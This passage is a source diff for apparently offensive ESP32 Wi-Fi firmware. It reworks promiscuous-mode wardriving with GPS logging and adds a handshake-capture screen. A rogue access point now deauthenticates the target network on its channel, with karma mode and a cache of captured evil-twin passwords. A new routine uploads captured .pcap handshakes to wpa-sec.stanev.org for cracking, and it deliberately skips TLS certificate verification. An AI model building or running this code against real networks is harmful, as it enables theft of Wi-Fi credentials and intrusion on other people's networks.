@@ -6377,231 +7680,405 @@ static void handshake_stop_btn_cb(lv_event_t *e)
     handshake_status_list = NULL;
     handshake_ui_active = false;
     scan_done_ui_flag = false;
-    
+
+    if (hs_ui_timer) { lv_timer_del(hs_ui_timer); hs_ui_timer = NULL; }
+    hs_ui_channel_label = NULL;
+    hs_ui_target_label = NULL;
+    hs_ui_beacon_label = NULL;
+    hs_ui_m1_label = NULL;
+    hs_ui_m2_label = NULL;
+    hs_ui_m3_label = NULL;
+    hs_ui_m4_label = NULL;
+    hs_ui_stats_label = NULL;
+    hs_ui_status_label = NULL;
+
     ESP_LOGI(TAG, "All operations stopped.");
-    
-    // Navigate back to menu
     nav_to_menu_flag = true;
 }
 
-// Wardrive task (from original project)
+// Wardrive task kept as wrapper
 static void wardrive_task(void *pvParameters) {
     (void)pvParameters;
-    
-    ESP_LOGI(TAG, "Wardrive task started");
-    
-    // Use timestamp-based filename instead of scanning SD to avoid SPI conflicts with LVGL
-    wardrive_file_counter = (int)(esp_timer_get_time() / 1000000);  // Unix timestamp in seconds
-    ESP_LOGI(TAG, "Wardrive file will be: w%d.log", wardrive_file_counter);
-    
+    wardrive_promisc_task(pvParameters);
+}
+
+// Wardrive promisc task: D-UCB channel selection + beacon sniffing
+static void wardrive_promisc_task(void *pvParameters) {
+    (void)pvParameters;
+    ESP_LOGI(TAG, "Wardrive promisc task started");
+
+    wardrive_file_counter = (int)(esp_timer_get_time() / 1000000);
+
+    wdp_seen_count = 0;
+    wdp_dwell_new_networks = 0;
+    wdp_needs_grow = false;
+    if (wdp_seen_networks) memset(wdp_seen_networks, 0, (size_t)wdp_seen_capacity * sizeof(wdp_network_t));
+
     ESP_LOGI(TAG, "Waiting for GPS fix...");
-    if (!wait_for_gps_fix(120)) {
-        ESP_LOGI(TAG, "Warning: No GPS fix obtained, not continuing without GPS data");
-        wardrive_active = false;
-    } else {
-        ESP_LOGI(TAG, "GPS fix obtained");
-    }
-    
-    ESP_LOGI(TAG, "Wardrive started. Use Stop to stop");
-    
-    // Open file once at the beginning to minimize SPI conflicts
-    char filename[64];
-    snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);
-    
-    FILE *file = fopen(filename, "a");
-    if (file == NULL) {
-        file = fopen(filename, "w");
-        if (file == NULL) {
-            ESP_LOGI(TAG, "Failed to create file %s - aborting wardrive", filename);
-            wardrive_active = false;
-            wardrive_task_handle = NULL;
-            vTaskDelete(NULL);
-            return;
-        }
-    }
-    
-    // Write header if file is new
-    fseek(file, 0, SEEK_END);
-    if (ftell(file) == 0) {
-        fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board\n");
-        fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
-        fflush(file);  // Flush header
-    }
-    
-    int scan_counter = 0;
-    while (wardrive_active) {
-        if (!wardrive_active) {
-            ESP_LOGI(TAG, "Wardrive: Stop requested");
-            break;
-        }
-        
-        // Read GPS data
-        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
+    while (wardrive_active && !current_gps.valid) {
+        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
         if (len > 0) {
             wardrive_gps_buffer[len] = '\0';
-            char* line = strtok(wardrive_gps_buffer, "\r\n");
+            char *line = strtok(wardrive_gps_buffer, "\r\n");
             while (line != NULL) {
                 parse_gps_nmea(line);
                 line = strtok(NULL, "\r\n");
             }
         }
-        
-        // Use wifi_scanner API instead of direct ESP-IDF calls
-        if (!wardrive_active) break;
-        
-        // Start scan using wifi_scanner component
-        esp_err_t scan_err = wifi_scanner_start_scan();
-        if (scan_err != ESP_OK) {
-            ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_err));
-            vTaskDelay(pdMS_TO_TICKS(1000));
-            continue;
+        wd_ui_update_flag = true;
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    if (!wardrive_active) {
+        wardrive_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    ESP_LOGI(TAG, "GPS fix obtained! Lat:%.6f Lon:%.6f Sats:%d",
+             current_gps.latitude, current_gps.longitude, current_gps.satellites);
+
+    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
+    struct stat st = {0};
+    if (stat("/sdcard/lab/wardrives", &st) == -1) {
+        mkdir("/sdcard/lab", 0777);
+        mkdir("/sdcard/lab/wardrives", 0700);
+    }
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+
+    char filename[64];
+    snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);
+
+    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
+    FILE *file = fopen(filename, "w");
+    if (!file) {
+        ESP_LOGI(TAG, "Failed to create %s - aborting", filename);
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+        wardrive_active = false;
+        wardrive_task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+    fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board\n");
+    fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
+    fflush(file);
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+
+    wdp_ducb_init();
+
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(wdp_promiscuous_cb);
+    esp_wifi_set_promiscuous(true);
+
+    int64_t last_stats_us = esp_timer_get_time();
+    int networks_since_flush = 0;
+
+    while (wardrive_active) {
+        int ch_idx = wdp_ducb_select_channel();
+        int channel = wdp_ducb_channels[ch_idx].channel;
+        int dwell_ms = wdp_get_dwell_ms(wdp_ducb_channels[ch_idx].tier);
+
+        esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
+        wdp_current_channel = channel;
+        wd_ui_update_flag = true;
+        wdp_dwell_new_networks = 0;
+        vTaskDelay(pdMS_TO_TICKS(dwell_ms));
+
+        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(50));
+        if (len > 0) {
+            wardrive_gps_buffer[len] = '\0';
+            char *line = strtok(wardrive_gps_buffer, "\r\n");
+            while (line != NULL) { parse_gps_nmea(line); line = strtok(NULL, "\r\n"); }
         }
-        
-        // Wait for scan to complete (non-blocking scan from wifi_scanner)
-        int timeout = 0;
-        while (!wifi_scanner_is_done() && timeout < 200) {  // 20 seconds timeout
-            vTaskDelay(pdMS_TO_TICKS(100));
-            timeout++;
+
+        if (!current_gps.valid) {
+            ESP_LOGI(TAG, "[WDP] GPS fix lost, pausing promisc...");
+            esp_wifi_set_promiscuous(false);
+            while (wardrive_active && !current_gps.valid) {
+                len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
+                if (len > 0) {
+                    wardrive_gps_buffer[len] = '\0';
+                    char *l = strtok(wardrive_gps_buffer, "\r\n");
+                    while (l) { parse_gps_nmea(l); l = strtok(NULL, "\r\n"); }
+                }
+                vTaskDelay(pdMS_TO_TICKS(500));
+            }
             if (!wardrive_active) break;
+            ESP_LOGI(TAG, "[WDP] GPS fix re-acquired, resuming promisc.");
+            esp_wifi_set_promiscuous(true);
         }
-        
-        if (!wardrive_active) break;
-        
-        // Get scan results from wifi_scanner
-        int scan_count = wifi_scanner_get_results(wardrive_scan_results, MAX_AP_CNT);
-        
-        ESP_LOGI(TAG, "Wardrive: scanned %d networks", scan_count);
-        
-        // Get timestamp
+
+        if (wdp_needs_grow) wdp_grow_network_buffer();
+
+        double reward = (double)wdp_dwell_new_networks;
+        wdp_ducb_update(ch_idx, reward);
+        wd_ui_update_flag = true;
+
+        if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
         char timestamp[32];
         get_timestamp_string(timestamp, sizeof(timestamp));
-        
-        // Process scan results and write to already-open file
-        for (int i = 0; i < scan_count; i++) {
-            wifi_ap_record_t *ap = &wardrive_scan_results[i];
-            
+        for (int i = 0; i < wdp_seen_count; i++) {
+            if (wdp_seen_networks[i].written_to_file) continue;
+            wdp_network_t *net = &wdp_seen_networks[i];
             char mac_str[18];
             snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
-                    ap->bssid[0], ap->bssid[1], ap->bssid[2],
-                    ap->bssid[3], ap->bssid[4], ap->bssid[5]);
-            
+                     net->bssid[0], net->bssid[1], net->bssid[2],
+                     net->bssid[3], net->bssid[4], net->bssid[5]);
             char escaped_ssid[64];
-            escape_csv_field((const char*)ap->ssid, escaped_ssid, sizeof(escaped_ssid));
-            
-            const char* auth_mode = get_auth_mode_wiggle(ap->authmode);
-            
-            char line[512];
-            if (current_gps.valid) {
-                snprintf(line, sizeof(line), 
-                        "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,%.2f,%.2f,WIFI\n",
-                        mac_str, escaped_ssid, auth_mode, timestamp,
-                        ap->primary, ap->rssi,
-                        current_gps.latitude, current_gps.longitude,
-                        current_gps.altitude, current_gps.accuracy);
-            } else {
-                snprintf(line, sizeof(line), 
-                        "%s,%s,[%s],%s,%d,%d,0.0000000,0.0000000,0.00,0.00,WIFI\n",
-                        mac_str, escaped_ssid, auth_mode, timestamp,
-                        ap->primary, ap->rssi);
-            }
-            
-            fprintf(file, "%s", line);
+            escape_csv_field(net->ssid, escaped_ssid, sizeof(escaped_ssid));
+            const char *auth = get_auth_mode_wiggle(net->authmode);
+            fprintf(file, "%s,%s,[%s],%s,%d,%d,%.7f,%.7f,0.00,0.00,WIFI\n",
+                    mac_str, escaped_ssid, auth, timestamp,
+                    net->channel, net->rssi, net->latitude, net->longitude);
+            net->written_to_file = true;
+            networks_since_flush++;
         }
-        
-        // Flush instead of close to ensure data is written but keep file open
-        fflush(file);
-        
-        if (scan_count > 0) {
-            ESP_LOGI(TAG, "Logged %d networks to %s", scan_count, filename);
+        if (networks_since_flush >= WDP_FILE_FLUSH_INTERVAL) {
+            fflush(file);
+            networks_since_flush = 0;
         }
-        
-        scan_counter++;
-        
-        if (!wardrive_active) {
-            ESP_LOGI(TAG, "Wardrive: Stop requested");
-            break;
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+
+        int64_t now = esp_timer_get_time();
+        if (now - last_stats_us >= WDP_STATS_INTERVAL_US) {
+            ESP_LOGI(TAG, "[WDP-STATS] Total:%d Ch:%d Tier:%d GPS:%s Sats:%d",
+                     wdp_seen_count, channel, wdp_ducb_channels[ch_idx].tier,
+                     current_gps.valid ? "Y" : "N", current_gps.satellites);
+            last_stats_us = now;
         }
-        
-        vTaskDelay(pdMS_TO_TICKS(5000)); // Wait 5 seconds between scans
     }
-    
-    // Close file only once at the end
-    if (file) {
-        fclose(file);
-    }
-    
+
+    esp_wifi_set_promiscuous(false);
+
+    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
+    if (file) { fflush(file); fclose(file); }
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+
     wardrive_active = false;
     wardrive_task_handle = NULL;
-    ESP_LOGI(TAG, "Wardrive stopped after %d scans. Last file: w%d.log", scan_counter, wardrive_file_counter);
-    
+    ESP_LOGI(TAG, "Wardrive promisc stopped. Total networks: %d. File: w%d.log",
+             wdp_seen_count, wardrive_file_counter);
     vTaskDelete(NULL);
+}
+
+// Timer callback for wardrive dashboard UI (every 1s)
+static void wd_ui_timer_cb(lv_timer_t *timer) {
+    (void)timer;
+    if (!wardrive_ui_active) return;
+
+    if (wd_ui_channel_label) {
+        char wd_ch_buf[16];
+        snprintf(wd_ch_buf, sizeof(wd_ch_buf), "CH %d", wdp_current_channel);
+        lv_label_set_text(wd_ui_channel_label, wd_ch_buf);
+    }
+
+    // GPS status
+    if (wd_ui_gps_label) {
+        char gps_buf[80];
+        if (current_gps.valid) {
+            snprintf(gps_buf, sizeof(gps_buf), LV_SYMBOL_GPS " %.5f, %.5f  Sats: %d",
+                     current_gps.latitude, current_gps.longitude, current_gps.satellites);
+            lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_GREEN, 0);
+        } else {
+            snprintf(gps_buf, sizeof(gps_buf), "Waiting for GPS fix...  Sats: %d", current_gps.satellites);
+            lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_ORANGE, 0);
+        }
+        lv_label_set_text(wd_ui_gps_label, gps_buf);
+    }
+
+    // Total networks counter
+    if (wd_ui_counter_label) {
+        char cnt_buf[32];
+        snprintf(cnt_buf, sizeof(cnt_buf), "%d", wdp_seen_count);
+        lv_label_set_text(wd_ui_counter_label, cnt_buf);
+    }
+
+    // Update table with last 50 networks
+    if (wd_ui_table) {
+        int total = wdp_seen_count;
+        int show = (total > 50) ? 50 : total;
+        int start = total - show;
+        lv_table_set_row_cnt(wd_ui_table, show + 1);
+        lv_table_set_col_cnt(wd_ui_table, 5);
+
+        lv_table_set_cell_value(wd_ui_table, 0, 0, "SSID");
+        lv_table_set_cell_value(wd_ui_table, 0, 1, "Ch");
+        lv_table_set_cell_value(wd_ui_table, 0, 2, "RSSI");
+        lv_table_set_cell_value(wd_ui_table, 0, 3, "Auth");
+        lv_table_set_cell_value(wd_ui_table, 0, 4, "Coords");
+
+        for (int i = 0; i < show; i++) {
+            wdp_network_t *net = &wdp_seen_networks[start + show - 1 - i];
+            char ssid_trunc[20];
+            strncpy(ssid_trunc, net->ssid[0] ? net->ssid : "[hidden]", 19);
+            ssid_trunc[19] = '\0';
+            lv_table_set_cell_value(wd_ui_table, i + 1, 0, ssid_trunc);
+
+            char ch_str[4];
+            snprintf(ch_str, sizeof(ch_str), "%d", net->channel);
+            lv_table_set_cell_value(wd_ui_table, i + 1, 1, ch_str);
+
+            char rssi_str[8];
+            snprintf(rssi_str, sizeof(rssi_str), "%d", net->rssi);
+            lv_table_set_cell_value(wd_ui_table, i + 1, 2, rssi_str);
+
+            const char *auth = get_auth_mode_wiggle(net->authmode);
+            char auth_short[8];
+            strncpy(auth_short, auth, 7);
+            auth_short[7] = '\0';
+            lv_table_set_cell_value(wd_ui_table, i + 1, 3, auth_short);
+
+            char coord_str[24];
+            if (net->latitude != 0.0f || net->longitude != 0.0f) {
+                snprintf(coord_str, sizeof(coord_str), "%.4f,%.4f", net->latitude, net->longitude);
+            } else {
+                snprintf(coord_str, sizeof(coord_str), "--");
+            }
+            lv_table_set_cell_value(wd_ui_table, i + 1, 4, coord_str);
+        }
+    }
 }
 
 static void wardrive_start_btn_cb(lv_event_t *e)
 {
     (void)e;
-    
-    // Set wardrive UI active flag
-    wardrive_ui_active = true;
+
     scan_done_ui_flag = false;
-    
-    // Delete the warning page content
-    if (function_page) {
-        lv_obj_clean(function_page);
-    }
-    
-    // Create log display page
-    wardrive_log_ta = lv_textarea_create(function_page);
-    lv_obj_set_size(wardrive_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
-    lv_obj_align(wardrive_log_ta, LV_ALIGN_TOP_MID, 0, 30);
-    lv_textarea_set_text(wardrive_log_ta, "Starting Wardrive...\n");
-    lv_obj_set_style_bg_color(wardrive_log_ta, lv_color_make(0, 0, 0), 0);
-    lv_obj_set_style_text_color(wardrive_log_ta, COLOR_MATERIAL_BLUE, 0);
-    lv_obj_set_style_border_color(wardrive_log_ta, COLOR_MATERIAL_BLUE, 0);
-    lv_obj_set_style_border_width(wardrive_log_ta, 2, 0);
-    lv_obj_clear_state(wardrive_log_ta, LV_STATE_FOCUSED);
-    
-    // Create Stop button at bottom
+
+    create_function_page_base("Wardrive");
+    wardrive_ui_active = true;
+
+    // ─── GPS status bar (top) ─────────────────────────────────────
+    wd_ui_gps_label = lv_label_create(function_page);
+    lv_label_set_text(wd_ui_gps_label, "Waiting for GPS fix...  Sats: 0");
+    lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_text_font(wd_ui_gps_label, &lv_font_montserrat_12, 0);
+    lv_obj_align(wd_ui_gps_label, LV_ALIGN_TOP_LEFT, 8, 34);
+
+    // ─── D-UCB Channel indicator (top, next to GPS) ───────────────
+    lv_obj_t *wd_ch_box = lv_obj_create(function_page);
+    lv_obj_set_size(wd_ch_box, 90, 46);
+    lv_obj_align(wd_ch_box, LV_ALIGN_TOP_RIGHT, -126, 32);
+    lv_obj_set_style_bg_color(wd_ch_box, lv_color_make(30, 30, 45), 0);
+    lv_obj_set_style_border_color(wd_ch_box, lv_color_make(76, 175, 80), 0);
+    lv_obj_set_style_border_width(wd_ch_box, 2, 0);
+    lv_obj_set_style_radius(wd_ch_box, 10, 0);
+    lv_obj_set_style_pad_all(wd_ch_box, 0, 0);
+    lv_obj_clear_flag(wd_ch_box, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *wd_ch_title = lv_label_create(wd_ch_box);
+    lv_label_set_text(wd_ch_title, "D-UCB");
+    lv_obj_set_style_text_color(wd_ch_title, lv_color_make(76, 175, 80), 0);
+    lv_obj_set_style_text_font(wd_ch_title, &lv_font_montserrat_12, 0);
+    lv_obj_align(wd_ch_title, LV_ALIGN_TOP_MID, 0, 2);
+
+    wd_ui_channel_label = lv_label_create(wd_ch_box);
+    lv_label_set_text(wd_ui_channel_label, "CH --");
+    lv_obj_set_style_text_color(wd_ui_channel_label, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_text_font(wd_ui_channel_label, &lv_font_montserrat_16, 0);
+    lv_obj_align(wd_ui_channel_label, LV_ALIGN_BOTTOM_MID, 0, -2);
+
+    // ─── Network counter (prominent, top right) ──────────────────
+    lv_obj_t *cnt_box = lv_obj_create(function_page);
+    lv_obj_set_size(cnt_box, 110, 46);
+    lv_obj_align(cnt_box, LV_ALIGN_TOP_RIGHT, -8, 32);
+    lv_obj_set_style_bg_color(cnt_box, lv_color_make(30, 30, 45), 0);
+    lv_obj_set_style_border_color(cnt_box, lv_color_make(0, 188, 212), 0);
+    lv_obj_set_style_border_width(cnt_box, 2, 0);
+    lv_obj_set_style_radius(cnt_box, 10, 0);
+    lv_obj_set_style_pad_all(cnt_box, 0, 0);
+    lv_obj_clear_flag(cnt_box, LV_OBJ_FLAG_SCROLLABLE);
+
+    lv_obj_t *cnt_title = lv_label_create(cnt_box);
+    lv_label_set_text(cnt_title, "NETWORKS");
+    lv_obj_set_style_text_color(cnt_title, lv_color_make(0, 188, 212), 0);
+    lv_obj_set_style_text_font(cnt_title, &lv_font_montserrat_12, 0);
+    lv_obj_align(cnt_title, LV_ALIGN_TOP_MID, 0, 2);
+
+    wd_ui_counter_label = lv_label_create(cnt_box);
+    lv_label_set_text(wd_ui_counter_label, "0");
+    lv_obj_set_style_text_color(wd_ui_counter_label, lv_color_make(255, 255, 255), 0);
+    lv_obj_set_style_text_font(wd_ui_counter_label, &lv_font_montserrat_20, 0);
+    lv_obj_align(wd_ui_counter_label, LV_ALIGN_BOTTOM_MID, 0, -2);
+
+    // ─── Recent networks table (main area) ───────────────────────
+    wd_ui_table = lv_table_create(function_page);
+    lv_obj_set_size(wd_ui_table, 464, LCD_V_RES - 80 - 56);
+    lv_obj_align(wd_ui_table, LV_ALIGN_TOP_MID, 0, 82);
+    lv_obj_set_style_bg_color(wd_ui_table, lv_color_make(15, 15, 15), 0);
+    lv_obj_set_style_border_color(wd_ui_table, lv_color_make(50, 50, 50), 0);
+    lv_obj_set_style_border_width(wd_ui_table, 1, 0);
+    lv_obj_set_style_radius(wd_ui_table, 6, 0);
+    lv_obj_set_style_text_font(wd_ui_table, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(wd_ui_table, lv_color_make(200, 200, 200), 0);
+    lv_obj_set_style_pad_top(wd_ui_table, 0, LV_PART_ITEMS);
+    lv_obj_set_style_pad_bottom(wd_ui_table, 0, LV_PART_ITEMS);
+    lv_obj_set_style_pad_left(wd_ui_table, 4, LV_PART_ITEMS);
+    lv_obj_set_style_pad_right(wd_ui_table, 2, LV_PART_ITEMS);
+
+    lv_table_set_col_cnt(wd_ui_table, 5);
+    lv_table_set_col_width(wd_ui_table, 0, 130);
+    lv_table_set_col_width(wd_ui_table, 1, 32);
+    lv_table_set_col_width(wd_ui_table, 2, 42);
+    lv_table_set_col_width(wd_ui_table, 3, 65);
+    lv_table_set_col_width(wd_ui_table, 4, 130);
+
+    lv_table_set_row_cnt(wd_ui_table, 1);
+    lv_table_set_cell_value(wd_ui_table, 0, 0, "SSID");
+    lv_table_set_cell_value(wd_ui_table, 0, 1, "Ch");
+    lv_table_set_cell_value(wd_ui_table, 0, 2, "RSSI");
+    lv_table_set_cell_value(wd_ui_table, 0, 3, "Auth");
+    lv_table_set_cell_value(wd_ui_table, 0, 4, "Coords");
+
+    // ─── Stop button (bottom center) ─────────────────────────────
     wardrive_stop_btn = lv_btn_create(function_page);
-    lv_obj_set_size(wardrive_stop_btn, 120, 35);
+    lv_obj_set_size(wardrive_stop_btn, 120, 46);
     lv_obj_align(wardrive_stop_btn, LV_ALIGN_BOTTOM_MID, 0, -5);
     lv_obj_set_style_bg_color(wardrive_stop_btn, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
     lv_obj_set_style_bg_color(wardrive_stop_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
     lv_obj_set_style_border_width(wardrive_stop_btn, 0, 0);
-    lv_obj_set_style_radius(wardrive_stop_btn, 8, 0);
+    lv_obj_set_style_radius(wardrive_stop_btn, 10, 0);
+    lv_obj_set_style_shadow_width(wardrive_stop_btn, 6, 0);
+    lv_obj_set_style_shadow_color(wardrive_stop_btn, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_flex_flow(wardrive_stop_btn, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(wardrive_stop_btn, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_t *x_icon2 = lv_label_create(wardrive_stop_btn);
+    lv_label_set_text(x_icon2, LV_SYMBOL_CLOSE);
+    lv_obj_set_style_text_font(x_icon2, &lv_font_montserrat_16, 0);
+    lv_obj_set_style_text_color(x_icon2, lv_color_make(255, 255, 255), 0);
     lv_obj_t *stop_lbl = lv_label_create(wardrive_stop_btn);
     lv_label_set_text(stop_lbl, "Stop");
+    lv_obj_set_style_text_font(stop_lbl, &lv_font_montserrat_12, 0);
     lv_obj_set_style_text_color(stop_lbl, lv_color_make(255, 255, 255), 0);
-    lv_obj_center(stop_lbl);
     lv_obj_add_event_cb(wardrive_stop_btn, wardrive_stop_btn_cb, LV_EVENT_CLICKED, NULL);
-    
-    // Enable log capture
+
+    // ─── Start timer for UI updates ──────────────────────────────
+    wd_ui_timer = lv_timer_create(wd_ui_timer_cb, 1000, NULL);
+
     wardrive_enable_log_capture();
-    
-    // Start wardrive task
+
     if (wardrive_active || wardrive_task_handle != NULL) {
         ESP_LOGI(TAG, "Wardrive already running");
         return;
     }
-    
-    ESP_LOGI(TAG, "Starting Wardrive...");
+
+    ESP_LOGI(TAG, "Starting Wardrive (promisc+D-UCB)...");
     wardrive_active = true;
-    
-    // Allocate wardrive task stack from PSRAM
+
     wardrive_task_stack = (StackType_t *)heap_caps_malloc(8192 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
     if (wardrive_task_stack != NULL) {
-        wardrive_task_handle = xTaskCreateStatic(wardrive_task, "wardrive_task", 8192, NULL, 
+        wardrive_task_handle = xTaskCreateStatic(wardrive_task, "wardrive_task", 8192, NULL,
             5, wardrive_task_stack, &wardrive_task_buffer);
         if (wardrive_task_handle == NULL) {
             ESP_LOGE(TAG, "Failed to create wardrive task");
             heap_caps_free(wardrive_task_stack);
             wardrive_task_stack = NULL;
-        } else {
-            ESP_LOGI(TAG, "Wardrive task created with PSRAM stack");
         }
     } else {
         ESP_LOGE(TAG, "Failed to allocate wardrive task stack from PSRAM");
     }
+
+    show_touch_dot = false;
+    if (touch_dot) lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
 }
 
 static void wardrive_stop_btn_cb(lv_event_t *e)
@@ -6630,11 +8107,20 @@ static void wardrive_stop_btn_cb(lv_event_t *e)
         ESP_LOGI(TAG, "Wardrive stopped");
     }
     
+    esp_wifi_set_promiscuous(false);
     wardrive_disable_log_capture();
     wardrive_log_ta = NULL;
     wardrive_stop_btn = NULL;
     wardrive_ui_active = false;
     scan_done_ui_flag = false;
+
+    if (wd_ui_timer) { lv_timer_del(wd_ui_timer); wd_ui_timer = NULL; }
+    wd_ui_gps_label = NULL;
+    wd_ui_counter_label = NULL;
+    wd_ui_channel_label = NULL;
+    wd_ui_table = NULL;
+    wdp_current_channel = 0;
+
     nav_to_menu_flag = true;
 }
 
@@ -8275,6 +9761,8 @@ static void show_wifi_connect_screen(void)
     const wifi_ap_record_t *ap = &records[idx];
     strncpy(wifi_connect_ssid, (const char *)ap->ssid, sizeof(wifi_connect_ssid) - 1);
     wifi_connect_ssid[sizeof(wifi_connect_ssid) - 1] = '\0';
+    memcpy(wifi_connect_bssid, ap->bssid, 6);
+    wifi_connect_channel = ap->primary;
     
     // Search eviltwin cache for password
     bool password_found = false;
@@ -8966,8 +10454,9 @@ static void rogue_ap_start_btn_cb(lv_event_t *e)
     wifi_attacks_set_evil_twin_event_cb(rogue_ap_ui_event_callback);
     wifi_attacks_set_karma_mode(true);
     
-    // Start the rogue AP
-    esp_err_t start_res = wifi_attacks_start_rogue_ap(wifi_connect_ssid, wifi_connect_password);
+    // Start the rogue AP with deauth against target BSSID on same channel
+    esp_err_t start_res = wifi_attacks_start_rogue_ap(wifi_connect_ssid, wifi_connect_password,
+                                                      wifi_connect_bssid, wifi_connect_channel);
     if (start_res != ESP_OK) {
         rogue_ap_add_status_message("Failed to start Rogue AP", lv_color_make(255, 100, 100));
         wifi_attacks_set_evil_twin_event_cb(NULL);
@@ -9074,16 +10563,533 @@ static void show_rogue_ap_page(void)
     }
 }
 
+// ============================================================================
+// WPA-SEC Upload Implementation
+// ============================================================================
+
+/**
+ * @brief Read WPA-SEC API key from /sdcard/lab/wpa-sec.txt
+ * Trims whitespace/newline. Requires sd_spi_mutex to be available.
+ * @return true on success, false if file missing or empty
+ */
+static bool wpasec_read_key_from_sd(void)
+{
+    wpasec_api_key[0] = '\0';
+
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+        FILE *f = fopen(WPASEC_KEY_PATH, "r");
+        if (f) {
+            char buf[WPASEC_KEY_MAX_LEN + 8];
+            if (fgets(buf, sizeof(buf), f) != NULL) {
+                // Trim trailing newline / whitespace
+                size_t len = strlen(buf);
+                while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
+                       buf[len - 1] == ' ' || buf[len - 1] == '\t')) {
+                    buf[--len] = '\0';
+                }
+                // Trim leading whitespace
+                char *start = buf;
+                while (*start == ' ' || *start == '\t') start++;
+                if (strlen(start) > 0 && strlen(start) < WPASEC_KEY_MAX_LEN) {
+                    strncpy(wpasec_api_key, start, WPASEC_KEY_MAX_LEN - 1);
+                    wpasec_api_key[WPASEC_KEY_MAX_LEN - 1] = '\0';
+                }
+            }
+            fclose(f);
+        }
+        xSemaphoreGive(sd_spi_mutex);
+    }
+
+    return wpasec_api_key[0] != '\0';
+}
+
+/**
+ * @brief Write all data to esp_tls, handling partial writes
+ */
+static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len)
+{
+    int written = 0;
+    while (written < len) {
+        int ret = esp_tls_conn_write(tls, buf + written, len - written);
+        if (ret < 0) {
+            return ret;
+        }
+        written += ret;
+    }
+    return written;
+}
+
+/**
+ * @brief Upload a single .pcap file to wpa-sec.stanev.org
+ *
+ * Uses esp_tls directly for full control over TLS settings,
+ * specifically to skip server certificate verification.
+ *
+ * @param filepath  Full path to .pcap file on SD card
+ * @param filename  Just the filename (for the Content-Disposition header)
+ * @return 0 on success, 1 on duplicate ("already submitted"), -1 on error
+ */
+static int wpasec_upload_file(const char *filepath, const char *filename)
+{
+    // Read file into memory (acquire SD mutex)
+    FILE *f = NULL;
+    long file_size = 0;
+    uint8_t *file_buf = NULL;
+
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
+        f = fopen(filepath, "rb");
+        if (!f) {
+            ESP_LOGW(TAG, "WPA-SEC: Failed to open: %s", filepath);
+            xSemaphoreGive(sd_spi_mutex);
+            return -1;
+        }
+
+        fseek(f, 0, SEEK_END);
+        file_size = ftell(f);
+        fseek(f, 0, SEEK_SET);
+
+        if (file_size <= 0 || file_size > 512 * 1024) {
+            ESP_LOGW(TAG, "WPA-SEC: Invalid file size: %ld bytes", file_size);
+            fclose(f);
+            xSemaphoreGive(sd_spi_mutex);
+            return -1;
+        }
+
+        // Prefer PSRAM for file buffer
+        if (heap_caps_get_free_size(MALLOC_CAP_SPIRAM) > (size_t)file_size + 1024) {
+            file_buf = (uint8_t *)heap_caps_malloc((size_t)file_size, MALLOC_CAP_SPIRAM);
+        }
